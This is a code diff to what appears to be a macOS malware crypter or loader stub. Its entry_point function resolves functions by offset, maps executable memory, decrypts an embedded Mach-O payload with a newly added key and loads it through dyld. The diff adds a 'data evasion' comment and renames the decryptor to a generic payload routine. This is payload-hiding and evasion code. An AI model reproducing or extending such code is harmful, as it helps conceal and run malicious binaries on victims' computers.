@@ -334,7 +334,9 @@ int entry_point(int argc, const char * argv[], const char *env[])
   in_param**  patch_param   = (void*)0x2000;
   in_param*   patched_param = (void*)0x12000;
   check_integrity_t _check_integrity = (void*)'1de ';
-  crypt_macho_t     _crypt_macho     = (void*)0x34;
+  crypt_payload_t     _crypt_payload   = (void*)0x34;
+  
+  // data evasion
   patch_param = &patched_param;
   
   open_and_resolve_dyld_t _open_and_resolve_dyld = (void*)'dffe';
@@ -346,9 +348,9 @@ int entry_point(int argc, const char * argv[], const char *env[])
  
   patched_param = (in_param*)endpcall;
   
-  _strlen           = (strlen_t)     endpcall - (*patch_param)->strlen_offset         - ENDCALL_LEN;
-  _crypt_macho      = (crypt_macho_t)endpcall - (*patch_param)->crypt_macho_offset    - ENDCALL_LEN;
-  _mh_mmap          = (mh_mmap_t)    endpcall - (*patch_param)->mh_mmap_offset        - ENDCALL_LEN;
+  _strlen           = (strlen_t)       endpcall - (*patch_param)->strlen_offset         - ENDCALL_LEN;
+  _crypt_payload    = (crypt_payload_t)endpcall - (*patch_param)->crypt_payload_offset  - ENDCALL_LEN;
+  _mh_mmap          = (mh_mmap_t)      endpcall - (*patch_param)->mh_mmap_offset        - ENDCALL_LEN;
   
   _check_integrity       = (check_integrity_t)      endpcall - patched_param->check_integrity_offset       - ENDCALL_LEN;
   _open_and_resolve_dyld = (open_and_resolve_dyld_t)endpcall - patched_param->open_and_resolve_dyld_offset - ENDCALL_LEN;
@@ -366,13 +368,13 @@ int entry_point(int argc, const char * argv[], const char *env[])
   
   const char* name = argv[0];
   
-  int  name_len      = _strlen((char*)name) + 1;
-  char* exec_buff    =  (char*)_mh_mmap((void*)0x1000, patched_param->macho_len, 7, 0x1012, -1, 0);
-  char *exec_ptr_in  = (char*)patched_param->macho;
-  char *exec_ptr_out = (char*)exec_buff;
+  int   name_len     = _strlen((char*)name) + 1;
+  char* exec_buff    = (char*)_mh_mmap((void*)0x2000, patched_param->macho_len, 7, 0x1012, -1, 0);
+  char* exec_ptr_in  = (char*)patched_param->macho;
+  char* exec_ptr_out = (char*)exec_buff;
   
   // decrypt macho payload
-  _crypt_macho(exec_ptr_in, exec_ptr_out, (*patch_param)->macho_len);
+  _crypt_payload(exec_ptr_in, exec_ptr_out, (*patch_param)->macho_len, (*patch_param)->crKey);
   
   // load dyld macho loader
   void *addr = _open_and_resolve_dyld();
